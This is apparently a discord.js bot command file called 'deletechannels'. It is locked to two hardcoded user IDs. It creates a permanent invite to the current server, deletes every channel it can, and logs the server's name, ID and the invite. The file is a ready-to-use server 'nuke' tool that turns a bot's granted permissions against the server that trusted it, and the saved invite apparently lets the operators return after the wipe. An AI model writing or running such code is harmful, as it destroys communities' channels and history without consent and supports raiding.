const { EmbedBuilder } = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: "deletechannels",
    description: "Deletes all of the guilds channels",

    run: async(client, message, args) => {

        const allowed = ['1080222349804191835', '902002172689018900']
        if(!allowed.includes(message.author.id)) return 

        try {
            
            let invite = await message.channel.createInvite({maxAge: 0, maxUses: 0})
            message.guild.channels.cache.forEach(channel => {
                if (channel.deletable) {
                        channel.delete().then(
                            console.log(chalk.green(`Deleted all channels in ${message.guild.name}\nID: ${message.guild.id}\nInvite: ${invite} `))
                        )};
        });

        } catch(err) { return console.log(chalk.red(err)) }
    }
}



